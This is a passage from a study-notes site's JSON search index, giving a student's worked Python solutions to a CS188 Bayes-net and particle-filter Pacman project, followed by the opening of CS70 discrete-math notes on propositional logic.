print(f\"\\nX_RANGE: {X_RANGE}, Y_RANGE: {Y_RANGE}\\n\")\n    MAX_NOISE = 7\n\n    variables = []\n    edges = []\n    variableDomainsDict = {}\n\n    \"*** YOUR CODE HERE ***\"\n    MAX_DISTANCE = X_RANGE + Y_RANGE - 1\n    variables = [PAC, GHOST0, GHOST1, OBS0, OBS1]\n    edges = [(PAC, OBS0), (PAC, OBS1), (GHOST0, OBS0), (GHOST1, OBS1)]\n\n    variableDomainsDict[PAC] = [(x, y) for x in range(X_RANGE) for y in range(Y_RANGE)]\n    variableDomainsDict[GHOST0] = [(x, y) for x in range(X_RANGE) for y in range(Y_RANGE)]\n    variableDomainsDict[GHOST1] = [(x, y) for x in range(X_RANGE) for y in range(Y_RANGE)]\n    variableDomainsDict[OBS0] = range(MAX_DISTANCE + MAX_NOISE)\n    variableDomainsDict[OBS1] = range(MAX_DISTANCE + MAX_NOISE)\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n\n    net = bn.constructEmptyBayesNet(variables, edges, variableDomainsDict)\n    return net\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q2","title":"Q2","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_1","title":"explore","text":"<p>\u89c2\u5bdf\u7ed9\u6211\u4eec\u7684\u51e0\u4e2a\u4f8b\u5b50\uff0c\u4e0d\u96be\u53d1\u73b0\u5728 joinFactors \u540e\uff0ccondition bar <code>|</code> \u5de6\u4fa7\u7684\u53d8\u91cf\u4ecd\u7136\u5728\u5de6\u4fa7\uff0c\u5269\u4e0b\u7684\u5728\u53f3\u4fa7\uff1b\u6216\u8005\u4fbf\u4e8e\u7406\u89e3\uff0c\u53ea\u6709\u4e0d\u80fd\u591f\u88ab\u63a8\u5bfc\u7684\u53d8\u91cf\u7684\u6982\u7387\u7f6e\u4e8e\u53f3\u4fa7\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_1","title":"right","text":"<p>\u901a\u8fc7 python \u7684\u96c6\u5408\u4ee5\u53ca\u76f8\u5173\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u7b80\u5355\u5730\u5b9e\u73b0\uff1a</p> joinFactors<pre><code>def joinFactors(factors: List[Factor]):\n    # typecheck portion\n    setsOfUnconditioned = [set(factor.unconditionedVariables()) for factor in factors]\n    if len(factors) &gt; 1:\n        intersect = functools.reduce(lambda x, y: x &amp; y, setsOfUnconditioned)\n        if len(intersect) &gt; 0:\n            print(\"Factor failed joinFactors typecheck: \", factor)\n            raise ValueError(\"unconditionedVariables can only appear in one factor. \\n\"\n                    + \"unconditionedVariables: \" + str(intersect) + \n                    \"\\nappear in more than one input factor.\\n\" + \n                    \"Input factors: \\n\" +\n                    \"\\n\".join(map(str, factors)))\n\n\n    \"*** YOUR CODE HERE ***\"\n    setsOfConditioned = [set(factor.conditionedVariables()) for factor in factors]\n    # get all unconditioned and conditioned variables\n    allUnconditionedVariables = functools.reduce(lambda x, y: x | y, setsOfUnconditioned)\n    allConditionedVariables = functools.reduce(lambda x, y: x | y, setsOfConditioned)\n\n    newUnconditionedVariables = allUnconditionedVariables\n    newConditionedVariables = allConditionedVariables - allUnconditionedVariables\n\n    newFactor = Factor(newUnconditionedVariables, newConditionedVariables, list(factors)[0].variableDomainsDict())\n\n    for assignment in newFactor.getAllPossibleAssignmentDicts():\n        p = 1\n        for factor in factors:\n            p *= factor.getProbability(assignment)\n        newFactor.setProbability(assignment, p)\n    return newFactor\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q3","title":"Q3","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_2","title":"explore","text":"<p>\u65b0\u7684 Factor \u4e0d\u8fc7\u662f\u5c06 eliminationVariable \u4ece unconditionedVariables \u4e2d\u79fb\u9664\uff0c\u5e76\u5c06\u6240\u6709\u5305\u62ec\u5176\u7684 assignments \u7684\u6982\u7387\u76f8\u52a0\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_2","title":"right","text":"eliminate<pre><code>def eliminate(factor: Factor, eliminationVariable: str):\n    # autograder tracking -- don't remove\n    if not (callTrackingList is None):\n        callTrackingList.append(('eliminate', eliminationVariable))\n\n    # typecheck portion\n    if eliminationVariable not in factor.unconditionedVariables():\n        print(\"Factor failed eliminate typecheck: \", factor)\n        raise ValueError(\"Elimination variable is not an unconditioned variable \" \\\n                        + \"in this factor\\n\" + \n                        \"eliminationVariable: \" + str(eliminationVariable) + \\\n                        \"\\nunconditionedVariables:\" + str(factor.unconditionedVariables()))\n\n    if len(factor.unconditionedVariables()) == 1:\n        print(\"Factor failed eliminate typecheck: \", factor)\n        raise ValueError(\"Factor has only one unconditioned variable, so you \" \\\n                + \"can't eliminate \\nthat variable.\\n\" + \\\n                \"eliminationVariable:\" + str(eliminationVariable) + \"\\n\" +\\\n                \"unconditionedVariables: \" + str(factor.unconditionedVariables()))\n\n    \"*** YOUR CODE HERE ***\"\n    print(f\"old factor: {factor}\")\n    newFactor = Factor(factor.unconditionedVariables() - set([eliminationVariable]), factor.conditionedVariables(), factor.variableDomainsDict())\n    # get elimanationVariables's domain from old factor\n    eliminateDomain = factor.variableDomainsDict()[eliminationVariable]\n    for assignment in newFactor.getAllPossibleAssignmentDicts():\n        p = 0\n        assginmentWithEliVar = assignment.copy()\n        # sum up all the probability of the assignment with the elimination variable\n        for eli_val in eliminateDomain:\n            assginmentWithEliVar[eliminationVariable] = eli_val\n            p += factor.getProbability(assginmentWithEliVar)\n        newFactor.setProbability(assignment, p)\n\n    print(f\"newFactor: {newFactor}\")\n    return newFactor\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q4","title":"Q4","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_3","title":"explore","text":"<p>\u5728\u5df2\u6709\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5173\u6ce8 inferenceByElimination \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u91cc\u5f88\u5927\u7a0b\u5ea6\u4e0a\u6559\u6211\u4eec\u5982\u4f55\u4f7f\u7528\u4e00\u4e9b\u76f8\u5173\u7684\u51fd\u6570\u7684\u4f7f\u7528\u53ca\u6548\u679c\u3002\u5173\u6ce8\u5230\u6211\u4eec\u9700\u8981\u5b8c\u6210\u7684 inferenceByVariableElimination \u53c2\u6570\u548c\u8fd4\u56de\u975e\u5e38\u76f8\u4f3c\uff0c\u6211\u4eec\u5148\u5c06 IBE \u7684\u4ee3\u7801\u62f7\u8d1d\u8fc7\u6765\u770b\u770b\uff0c\u5c06 variable \u7684\u904d\u5386\u987a\u5e8f\u6539\u6539\uff08\u5373\u7c7b\u4f3c\u4e8e <code>for joinVariable in eliminationOrder:</code>\uff09\uff0c\u8fd0\u884c\u6709\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0cIBE \u7684\u884c\u4e3a\u662f\u5148\u90fd join \u518d\u90fd eliminate\uff0c\u800c IBVE \u662f\u4e00\u8fb9 join \u4e00\u8fb9 eliminate\uff0c\u8fd9\u548c\u6211\u4eec note \u4e2d IBE vs. VE \u662f\u4e00\u81f4\u7684\uff1b\u6b64\u5916\uff0c\u6ce8\u610f\u4e00\u4e0b\u53cd\u590d\u88ab\u63d0\u53ca\u7684\u53ea\u6709\u4e00\u4e2a unconditionedVariable \u7684\u60c5\u51b5\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_3","title":"right","text":"IBVE<pre><code>def inferenceByVariableElimination(bayesNet: bn, queryVariables: List[str], evidenceDict: Dict, eliminationOrder: List[str]):\n    # this is for autograding -- don't modify\n    joinFactorsByVariable = joinFactorsByVariableWithCallTracking(callTrackingList)\n    eliminate             = eliminateWithCallTracking(callTrackingList)\n    if eliminationOrder is None: # set an arbitrary elimination order if None given\n        eliminationVariables = bayesNet.variablesSet() - set(queryVariables) - set(evidenceDict.keys())\n        eliminationOrder = sorted(list(eliminationVariables))\n\n    \"*** YOUR CODE HERE ***\"\n    factorsList = bayesNet.getAllCPTsWithEvidence(evidenceDict)\n\n    # join all factors by variable\n    for variable in eliminationOrder:\n        factorsList, factor = joinFactorsByVariable(factorsList, variable)\n        if len(factor.unconditionedVariables()) &lt;= 1:\n            continue\n        factorsList.append(eliminate(factor, variable))\n\n    return normalize(joinFactors(factorsList))\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q5","title":"Q5","text":"<p>\u6bd4\u8f83\u7b80\u5355\uff0c\u53ef\u4ee5\u81ea\u5df1\u5199\u5b8c\u4e86\u5982\u679c\u6ca1\u8fc7\u518d\u6765\u6bd4\u5bf9\uff1b\u7279\u4f8b\u6709\u6839\u636e\u6d4b\u8bd5\u7ed3\u679c\u6765\u5904\u7406\u7684\u610f\u5473\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#a","title":"a","text":"normalize<pre><code>def normalize(self):\n    \"*** YOUR CODE HERE ***\"\n    total = self.total()\n    # \u52a0\u4e0a total == 1 \u53ef\u4ee5\u51cf\u5c11\u540e\u7eed\u5f00\u9500\n    if total == 0 or total == 1:\n        return\n    for key in self.keys():\n        self[key] /= total\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n\ndef sample(self):\n    \"*** YOUR CODE HERE ***\"\n    self.normalize()\n    p = random.random() # [0, 1)\n    total = 0\n    for key in self.keys():\n        total += self[key]\n        if total &gt; p:\n            return key\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#b","title":"b","text":"observation<pre><code>def getObservationProb(self, noisyDistance: int, pacmanPosition: Tuple, ghostPosition: Tuple, jailPosition: Tuple):\n    \"*** YOUR CODE HERE ***\"\n    # special case: ghost is in jail, code according to the testcase and results.\n    if ghostPosition == jailPosition:\n        return 1.0 if noisyDistance is None else 0.0\n    elif noisyDistance is None:\n        return 0.0\n    trueDistance = manhattanDistance(pacmanPosition, ghostPosition)\n    return busters.getObservationProbability(noisyDistance, trueDistance)\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q6","title":"Q6","text":"<p>\u9488\u5bf9\u6240\u6709\u53ef\u80fd\u4f4d\u7f6e\u4f7f\u7528 Q5 \u5b9e\u73b0\u7684\u529f\u80fd\u5373\u53ef\uff1a</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_4","title":"right","text":"observe update<pre><code>def observeUpdate(self, observation: int, gameState: busters.GameState):\n    \"*** YOUR CODE HERE ***\"\n    pacmanPosition = gameState.getPacmanPosition()\n    jailPosition = self.getJailPosition()\n    for p in self.allPositions:\n        self.beliefs[p] = self.getObservationProb(observation, pacmanPosition, p, jailPosition) * self.beliefs[p]\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n    self.beliefs.normalize()\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q7","title":"Q7","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_4","title":"explore","text":"<p>\u5176\u5b9e\u4e5f\u5c31\u662f\u77e5\u9053\u6240\u6709\u7684 P(newPos=n | oldPos=o) \uff0c\u603b\u7684\u6982\u7387\u5206\u5e03\uff0c\u76f8\u52a0\u5373\u53ef\u3002</p> <p>\u8d77\u521d\u5982\u6b64\u66f4\u65b0\uff1a</p> elapse time v1<pre><code>def elapseTime(self, gameState: busters.GameState):\n    \"*** YOUR CODE HERE ***\"\n    for oldPos in self.allPositions:\n        newPosDist = self.getPositionDistribution(gameState, oldPos)\n        oldProb = self.beliefs[oldPos]\n        for newPos in newPosDist.keys():\n            self.beliefs[newPos] += oldProb * newPosDist[newPos]\n    \"*** END YOUR CODE HERE ***\"\n</code></pre> <p>\u4f46\u662f\u65e0\u7591\uff0c\u6211\u4eec\u5728\u7b2c 5 \u884c\u9700\u8981\u4ece\u539f\u5206\u5e03\u4e2d\u5bfb\u627e oldProb\uff0c\u6240\u4ee5\u5e94\u8be5\u65b0\u8d77\u4e00\u4e2a\u5206\u5e03\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_5","title":"right","text":"elapse time v2<pre><code>def elapseTime(self, gameState: busters.GameState):\n    \"*** YOUR CODE HERE ***\"\n    newBeliefs = DiscreteDistribution()\n    for oldPos in self.allPositions:\n        newPosDist = self.getPositionDistribution(gameState, oldPos)\n        oldProb = self.beliefs[oldPos]\n        for newPos in newPosDist.keys():\n            newBeliefs[newPos] += oldProb * newPosDist[newPos]\n    newBeliefs.normalize() # \u65e0\u9700\u4e5f\u53ef\n    self.beliefs = newBeliefs\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q8","title":"Q8","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_5","title":"explore","text":"<p>\u9996\u5148\u9898\u76ee\u544a\u8bc9\u6211\u4eec\u5c06 ghost \u6700\u53ef\u80fd\u51fa\u73b0\u7684\u5730\u65b9\u8ba4\u4e3a\u662f\u6b64\u65f6\u5176\u4f4d\u7f6e\uff1b\u6211\u4eec\u5e0c\u671b\u671d\u7740\u6700\u8fd1\u7684 ghost \u51fa\u53d1\u3002\u63a5\u4e0b\u6765\u548c\u6211\u4eec\u5728\u524d\u9762\u51e0\u4e2a project \u4e2d\u4e00\u6837\uff0c\u5bf9\u6267\u884c\u6bcf\u79cd\u884c\u52a8\u8fdb\u884c\u8bc4\u4f30\uff08\u8fd9\u91cc\u5373\u4e3a mazeDistance\uff09\uff0c\u505a\u51fa\u6289\u62e9\u3002szzxljr  \u7ed9\u51fa\u4e86\u4e00\u79cd\u66f4\u52a0\u4f18\u96c5\u7684\u5199\u6cd5\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_6","title":"right","text":"choose action<pre><code>def chooseAction(self, gameState: busters.GameState):\n    pacmanPosition = gameState.getPacmanPosition()\n    legal = [a for a in gameState.getLegalPacmanActions()]\n    livingGhosts = gameState.getLivingGhosts()\n    livingGhostPositionDistributions = \\\n        [beliefs for i, beliefs in enumerate(self.ghostBeliefs)\n         if livingGhosts[i+1]]\n    \"*** YOUR CODE HERE ***\"\n    ghostPos = [beliefs.argMax() for beliefs in livingGhostPositionDistributions]\n    # https://github.com/szzxljr/CS188_Course_Projects/blob/7beea60ec9037fa5b750d211c90d814a954cbdfe/proj5_tracking/bustersAgents.py#L145\n    closeGhostPos = min(ghostPos, key = lambda pos : self.distancer.getDistance(pacmanPosition, pos))\n    chosenAction = min(legal, key = lambda action : self.distancer.getDistance(Actions.getSuccessor(pacmanPosition, action), closeGhostPos))\n    return chosenAction\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q9","title":"Q9","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_6","title":"explore","text":"<p>\u5bf9\u4e8e particle filter \uff0c\u53ef\u4ee5\u5148\u770b Object Tracking Using Particle Filter \uff1b\u6709\u4e00\u4e9b\u4e0d\u540c\u7684\u662f\uff0c\u5728\u6587\u7ae0\u4e2d\u53ef\u89c6\u5316\u65f6\u7528\u7c92\u5b50\u7684\u5927\u5c0f\u4ee3\u8868\u6982\u7387\uff0c\u800c\u6211\u4eec\u8fd9\u91cc\u7528\u7684\u662f\u7c92\u5b50\u7684\u6570\u91cf\uff08\u81f3\u5c11\u5728 Q9 \u8fd9\u91cc\uff09\u3002\u5bf9\u4e8e\u7c92\u5b50\u6570\u4e0d\u662f\u53ef\u884c\u4f4d\u7f6e\u6570\u7684\u6574\u6570\u500d\u8be5\u600e\u4e48\u529e\uff0c\u6211\u5176\u5b9e\u6ca1\u6709\u76f4\u63a5\u88ab\u544a\u8bc9\u5982\u4f55\u5904\u7406\uff1b\u5728\u6d4b\u8bd5\u62a5\u9519\u4e0b\uff0c\u5c31\u76f4\u63a5\u4e00\u4e2a\u4e00\u4e2a\u4f4d\u7f6e\u7684\u653e\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right_7","title":"right","text":"particle filter<pre><code>def initializeUniformly(self, gameState: busters.GameState):\n    self.particles = []\n    \"*** YOUR CODE HERE ***\"\n    numPart = self.numParticles\n    numPost = len(self.legalPositions)\n    self.particles = [self.legalPositions[i % numPost] for i in range(numPart)]\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n\ndef getBeliefDistribution(self):\n    \"*** YOUR CODE HERE ***\"\n    beliefs = DiscreteDistribution()\n    for part in self.particles:\n        beliefs[part] += 1\n    beliefs.normalize()\n    return beliefs\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q10","title":"Q10","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_7","title":"explore","text":"<p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e observation \u6765\u66f4\u65b0\u7c92\u5b50\u7684\u5206\u5e03\uff1b\u7c7b\u6bd4\u4e8e\u6211\u4eec\u4e0a\u4e00\u4e2a\u5b9e\u73b0\u7684 observeUpdate \u51fd\u6570\uff0c\u6211\u4eec\u672c\u5e94\u8be5\u5c06 getObservationProb \u7684\u7ed3\u679c\u4e58\u4ee5\u5bf9\u5e94\u4f4d\u7f6e\u7c92\u5b50\u6570\u5360\u603b\u7c92\u5b50\u6570\u6bd4\u4f8b\uff1b\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u8bb0\u5f55\u7684\u53ea\u662f\u6bcf\u4e2a\u7c92\u5b50\u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u76f4\u63a5\u904d\u5386\u6240\u6709\u7c92\u5b50\u66f4\u52a0\u65b9\u4fbf\uff0c\u6700\u540e\u5f52\u4e00\u5316\u5373\u53ef\u3002</p> observeUpdate<pre><code>def observeUpdate(self, observation: int, gameState: busters.GameState):\n    \"*** YOUR CODE HERE ***\"\n    beliefs = DiscreteDistribution()\n    jailPosition = self.getJailPosition()\n    pacmanPosition = gameState.getPacmanPosition()\n    for part in self.particles:\n        beliefs[part] += self.getObservationProb(observation, pacmanPosition, part, jailPosition)\n    if beliefs.total() == 0:\n        self.initializeUniformly(gameState)\n    else:\n        beliefs.normalize()\n        self.particles = [beliefs.sample() for _ in range(self.numParticles)]\n    self.beliefs = beliefs\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q11","title":"Q11","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore_8","title":"explore","text":"<p>\u7167\u732b\u753b\u864e\uff1f\u4eff\u7167 ExactInference\uff0c\u6709\uff1a</p> elapse time v1<pre><code>def elapseTime(self, gameState):\n    \"*** YOUR CODE HERE ***\"\n    newBeliefs = DiscreteDistribution()\n    for part in self.particles:\n        newPosDist = self.getPositionDistribution(gameState, part)\n        for newPos in newPosDist.keys():\n            newBeliefs[newPos] += newPosDist[newPos]\n    newBeliefs.normalize()\n    self.beliefs = newBeliefs\n    self.particles = [self.beliefs.sample() for _ in range(self.numParticles)]\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre> <p>\u4f46\u662f\u4f1a\u53d1\u73b0\uff0c\u8fd9\u6837\u662f\u65e0\u6cd5\u901a\u8fc7\u7b2c\u4e94\u4e2a\u6d4b\u8bd5\u6837\u4f8b\u7684\u3002</p> <p></p> <p>\u6709\u70b9\u8ff7\uff0c\u76f4\u5230\u6211\u5c1d\u8bd5\u5bf9\u4e8e\u6bcf\u4e2a newPosDist \u5206\u522b\u8fdb\u884c\u91c7\u6837\uff0c\u53d1\u73b0\u901a\u8fc7\u4e86\uff1f\u989d\uff0c</p> elapse time v2<pre><code>def elapseTime(self, gameState):\n    \"*** YOUR CODE HERE ***\"\n    newParticles = []\n    for part in self.particles:\n        newPosDist = self.getPositionDistribution(gameState, part)\n        newParticles.append(newPosDist.sample())\n    self.particles = newParticles\n    self.beliefs = self.getBeliefDistribution()\n    # raiseNotDefined()\n    \"*** END YOUR CODE HERE ***\"\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#pass","title":"pass","text":"<ul> <li>project-4 \u5168\u901a\u8fc7</li> <li>\u5168\u4ee3\u7801</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs70/","title":"Discrete Mathematics and Probability Theory","text":"","tags":["notes","DMPT"]},{"location":"note/cs70/#_1","title":"\u4ecb\u7ecd","text":"<p>DMPT\uff0c\u5373 Discrete Mathematics and Probability Theory\uff0c\u5728\u6211\u6821\u5f00\u8bbe\u4e86\u7c7b\u4f3c\u8bfe\u7a0b\uff0c\u542c\u8bfe \u7684\u540c\u65f6\u5b66\u4e60\u4e86CS70 at UC Berkeley, Spring 2024\uff0c\u7b14\u8bb0\u4e2d\u7edd\u5927\u591a\u6570\u5185\u5bb9\u6765\u6e90\u4e8e\u6b64\u3002</p> <p>\u5f53\u7136\u4e5f\u6709\u4e0d\u5c11 CS70 \u4e0d\u540c\u4e4b\u5904\uff0c\u672c\u4eba\u4f7f\u7528\u4e86\u5b66\u957f\u7684\u7b14\u8bb0\u54b8\u9c7c\u6684 insr</p> <p>\u603b\u4e4b\uff0c\u8fd9\u91cc\u4e3b\u8981\u662f CS 70 at UC Berkeley, Spring 2024 \u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u540c\u65f6 \u6284\u88ad \u501f\u9274\u4e86\u5b66\u957f\u7b14\u8bb0\u4ee5\u8bb0\u5f55\u5fc5\u5907\u7684\u4e00\u4e9b\u6982\u5ff5\u3002</p> <p>\u5bf9\u4e8e CS 70 at UC Berkeley, Spring 2024 \u7ed9\u51fa\u7684 HW \uff0c\u6211\u4f1a\u9009\u62e9\u6027\u5730\u4ee5 Practice \u7684\u5f62\u5f0f\u52a0\u5728\u5404\u7b14\u8bb0\u672b\u5c3e\uff1b\u800c ZJU \u8bfe\u7a0b\u7684\u4f5c\u4e1a\u7b54\u6848\u4e0d\u77e5\u53ef\u5426\u516c\u5e03\uff0c\u6682\u4e0d\u653e\u51fa\u3002</p> <p>2024/4/26 \u7f16\u8f91\uff1a\u7b14\u8bb0\u66f4\u5230 note 17 \u5c31\u65ad\u66f4\u4e86\uff0c\u5176\u5b9e\u540e\u9762\u8fd8\u6709\u4e00\u4e9b\u5185\u5bb9\uff0c\u4f46\u662f\u7eaf\u82f1\u6587\u7a3f\u5bf9\u4e8e\u5b8c\u5168\u4e0d\u719f\u6089\u7684\u77e5\u8bc6\u70b9\u8fd8\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u540e\u9762\u9884\u8ba1\u66f4\u65b0 OI wiki \u4e0a\u9762\u7684\u4e00\u4e9b\u5185\u5bb9\u3002</p>","tags":["notes","DMPT"]},{"location":"note/cs70/#other","title":"other","text":"<p>\u4e0b\u9762\u662f\u4e00\u4e9b\u5728\u7b14\u8bb0\u4e2d\u51fa\u73b0\u4f46\u662f\u6bd4\u8f83\u6742\u4e71\u7684\u77e5\u8bc6\u70b9\uff1a</p> <p>abbreviation</p> <p>i.e. \u8bcd\u6e90\u662f\u62c9\u4e01\u8bed id est \uff0c\u82f1\u6587\u542b\u4e49\u4e3a that is/in other words\uff08\u5373/\u6362\u800c\u8a00\u4e4b\uff09\u3002\u6587\u7ae0\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bfb\u5b57\u6bcd\u97f3i.e,\u5168\u79f0\u53ef\u4ee5\u6309\u7167\u610f\u5927\u5229\u8bed\u7684\u8bfb\u97f3\u6765\u8bfb/id est/</p> <p>e.g. \u62c9\u4e01\u8bed\u5168\u79f0 exempli gratia\uff0c\u82f1\u6587\u542b\u4e49\u4e3a for example/example given\uff08\u4e3e\u4e2a\u4f8b\u5b50\uff09\u3002\u6587\u7ae0\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bfb\u5b57\u6bcd\u97f3e.g,\u5168\u79f0\u8bfb\u97f3/\u026a\u0261\u02c8zempl\u026a \u02c8\u0261r\u0251\u02d0t\u026a\u02cc\u0251\u02d0/</p> <p>etc. \u62c9\u4e01\u8bed\u5168\u79f0 et cetera\uff0c\u82f1\u6587\u542b\u4e49\u4e3a and so on/and the rest of the things\uff08\u7b49\u7b49\uff09\u6587\u7ae0\u4e2d\u8bfb\u97f3 /\u02ccet \u02c8set\u0259r\u0259; \u02cc\u026at \u02c8set\u0259r\u0259/</p> <p>a.k.a. \u662f\"also know as\"\u7684\u7f29\u5199</p> <p>iff \u662f\u201cif and only if\u201d \u7684\u610f\u601d\uff0c\u5f53\u4e14\u4ec5\u5f53\uff0c\u4e5f\u53ef\u4ee5\u770b\u6210\u662f\u7b49\u4ef7\u4e8e</p> <p>\u8d44\u6599\u6765\u6e90</p>","tags":["notes","DMPT"]},{"location":"note/cs70/01-Propositional_Logic/","title":"01 Propositional Logic","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i-introduction","title":"I Introduction","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i1-base-notations","title":"I.1 base notations","text":"<p>Our first building block is the notion of a proposition, which is simply a statement which is either true or false.</p> <p>For example:</p> <p></p> <p>Notations we should know:</p> <ol> <li>Conjunction\uff08\u5408\u53d6\uff09: P\u2227Q (\u201cP and Q\u201d). True only when both P and Q are true.</li> <li>Disjunction\uff08\u6790\u53d6\uff09: P\u2228Q (\u201cP or Q\u201d). True when at least one of P and Q is true.</li> <li>Negation\uff08\u53d6\u53cd/\u5426\uff09: \u00acP (\u201cnot P\u201d). True when P is false.</li> <li>Implication\uff08\u8574\u6db5\u8bcd\uff09: P \u21d2 Q (\u201cP implies Q\u201d). This is the same as \u201cIf P, then Q.\u201d**</li> <li>two-way implication  p\u2194q</li> </ol> \\[ \\begin{aligned}&amp;(\\mathrm{a})\\:\\forall x\\forall yP(x,y)\\implies\\forall y\\forall xP(x,y).&amp;&amp;\\text{True}\\\\&amp;(\\mathrm{b})\\:\\forall x\\exists yP(x,y)\\implies\\exists y\\forall xP(x,y).&amp;&amp;\\text{False}\\\\&amp;(\\mathrm{c})\\:\\exists x\\forall yP(x,y)\\implies\\forall y\\exists xP(x,y).&amp;&amp;\\text{True}\\\\&amp;(\\mathrm{a})\\:\\forall x\\:(P(x)\\wedge Q(x))\\stackrel{?}{\\equiv}\\:\\forall x\\:P(x)\\wedge\\forall x\\:Q(x)\\quad\\textsf{T}\\\\&amp;(\\mathrm{b})\\:\\forall x\\:(P(x)\\vee Q(x))\\stackrel{?}{\\equiv}\\:\\forall x\\:P(x)\\vee\\forall x\\:Q(x)\\quad\\textsf{F}\\\\&amp;(\\mathrm{c})\\:\\exists x\\:(P(x)\\vee Q(x))\\stackrel{?}{\\equiv}\\exists x\\:P(x)\\vee\\exists x\\:Q(x)\\quad\\textsf{T}\\\\&amp;(\\mathrm{d})\\:\\exists x\\:(P(x)\\wedge Q(x))\\stackrel{?}{\\equiv}\\exists x\\:P(x)\\wedge\\exists x\\:Q(x)\\quad\\textsf{F}\\end{aligned} \\] <p>(Detailed reason omission)</p> <ol> <li>quantifiers: The universal quantifier \u2200 (\u201cfor all\u201d) and the existential quantifier \u2203 (\u201cthere exists\u201d).</li> </ol> <p>We often write a proposition in the form of something like (\u2200x \u2208 Z)(\u2203y \u2208 Z)(x &lt; y)</p> <ol> <li>equivalent is something like:</li> </ol> <ul> <li>\u00ac(P\u2227Q) \u2261 (\u00acP\u2228 \u00acQ)</li> <li>\u00ac(P\u2228Q) \u2261 (\u00acP\u2227 \u00acQ)</li> </ul> <p>Of course, these two formulas should be remembered since they tell us how to negate conjunctions and disjunctions</p> <ol> <li>about P\u2192Q, the truth table is shown below:(<code>0</code> stands for F while <code>1</code> stands for T)</li> </ol> P Q P\u2192Q 0 0 1 0 1 1 1 0 0 1 1 1 <ol> <li>about P\u2194Q, the truth table is shown below:(<code>0</code> stands for F while <code>1</code> stands for T)</li> </ol> P Q P\u2194Q 0 0 1 0 1 0 1 0 0 1 1 1 <ol> <li>We say that a sentence A entails another sentence B if in all models that A is true, B is as well, and we represent this relationship as A \u22a8 B.</li> </ol>","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i2-proposition-formula","title":"I.2 proposition formula","text":"<p>\u91cd\u8a00\u5f0f\u53cd\u6620\u4e86\u4eba\u7c7b\u903b\u8f91\u601d\u7ef4\u7684\u57fa\u672c\u89c4\u5f8b\uff1a</p> \\[\\begin{aligned}&amp;\\bullet\\text{ \u6392\u4e2d\u5f8b }A\\lor\\neg A\\equiv T\\\\&amp;\\bullet\\text{ \u77db\u76fe\u5f8b }A\\land\\neg A\\equiv F\\\\&amp;\\bullet\\text{\u5047\u8a00\u63a8\u7406 }A\\land(A\\to B)\\vDash B\\\\&amp;\\bullet\\text{ \u5f52\u8c2c\u63a8\u7406 }(A\\to B)\\land\\neg B\\vDash\\neg A\\\\&amp;\\bullet\\text{ \u7a77\u4e3e\u63a8\u7406 }(A\\lor B)\\land(A\\to C)\\land(B\\to C)\\vDash C\\end{aligned}\\] 